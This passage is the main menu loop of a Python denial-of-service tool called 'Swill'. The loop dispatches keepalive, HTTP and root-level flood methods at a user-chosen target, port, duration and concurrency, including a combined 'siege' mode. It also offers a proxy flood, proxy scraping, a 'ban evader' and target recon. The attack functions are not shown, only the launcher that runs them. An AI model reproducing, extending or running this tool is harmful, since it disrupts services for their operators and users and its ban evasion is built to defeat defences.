        execute_threaded(name, fn, target, port, duration, concurrency)

def main():
    while True:
        try:
            show_menu()
            choice = input(f"  {C.BOLD}{C.CY}Swill >{C.RST} ").strip().lower()
            if choice == "q": clear(); print(f"\n  {C.BOLD}Swill out.{C.RST}\n"); break
            elif choice == "i": show_info(); continue
            elif choice == "l": show_logs(); continue
            elif choice == "h": show_history(); continue
            elif choice == "p": show_proxy_manager(); continue
            elif choice == "b": show_ban_evader(); continue
            elif choice == "r":
                raw = input_default("  Target: ", "127.0.0.1")
                p = int(input_default("  Port: ", "80"))
                recon(raw, p); continue
            elif choice == "s":
                result = get_target()
                target, port, duration, concurrency, use_proxy = result
                if not target: input(f"\n  {C.DIM}Press Enter...{C.RST}"); continue
                fns = [fn for _, fn, _ in KEEPALIVE_METHODS]
                loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
                try: loop.run_until_complete(execute_siege(target, port, duration, concurrency, fns, use_proxy))
                finally: loop.close()
                input(f"\n  {C.DIM}Press Enter for menu...{C.RST}"); continue
            elif choice == "c":
                result = get_target()
                target, port, duration, concurrency, use_proxy = result
                if not target: input(f"\n  {C.DIM}Press Enter...{C.RST}"); continue
                all_fns = [fn for _, fn, _ in KEEPALIVE_METHODS] + [fn for _, fn, _ in HTTP_METHODS_LIST]
                loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
                try: loop.run_until_complete(execute_siege(target, port, duration, concurrency, all_fns, use_proxy))
                finally: loop.close()
                input(f"\n  {C.DIM}Press Enter for menu...{C.RST}"); continue
            elif choice.isdigit():
                idx = int(choice)
                ka_count = len(KEEPALIVE_METHODS)
                http_count = len(HTTP_METHODS_LIST)
                root_count = len(ROOT_METHODS_LIST) if ROOT else 0
                total = ka_count + http_count + root_count
                if 1 <= idx <= total:
                    result = get_target()
                    target, port, duration, concurrency, use_proxy = result
                    if not target: input(f"\n  {C.DIM}Press Enter...{C.RST}"); continue
                    if idx <= ka_count:
                        name, fn, _ = KEEPALIVE_METHODS[idx - 1]
                        if name == "Proxy Flood" and not proxy_pool.has():
                            print(f"  {C.R}No proxies loaded. Use [P] to scrape first.{C.RST}")
                            time.sleep(2); continue
                        run_attack(name, "async", fn, target, port, duration, concurrency, use_proxy)
                    elif idx <= ka_count + http_count:
                        name, fn, _ = HTTP_METHODS_LIST[idx - ka_count - 1]
                        run_attack(name, "async", fn, target, port, duration, concurrency, use_proxy)
                    else:
                        name, fn, _ = ROOT_METHODS_LIST[idx - ka_count - http_count - 1]
                        run_attack(name, "thread", fn, target, port, duration, concurrency)
                    input(f"\n  {C.DIM}Press Enter for menu...{C.RST}"); continue
                else:
                    print(f"  {C.R}Invalid number{C.RST}"); time.sleep(1); continue
            else:
                print(f"  {C.R}Unknown command{C.RST}"); time.sleep(1); continue
        except KeyboardInterrupt:
            print(f"\n  {C.Y}Returning to menu...{C.RST}"); time.sleep(1); continue
        except Exception as e:
            log.error(f"Error: {e}")
            input(f"\n  {C.R}Error: {e}{C.RST}\n  {C.DIM}Press Enter...{C.RST}"); continue

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print(f"\n  {C.BOLD}Aborted.{C.RST}")
    except Exception as e: log.critical(f"Fatal: {e}")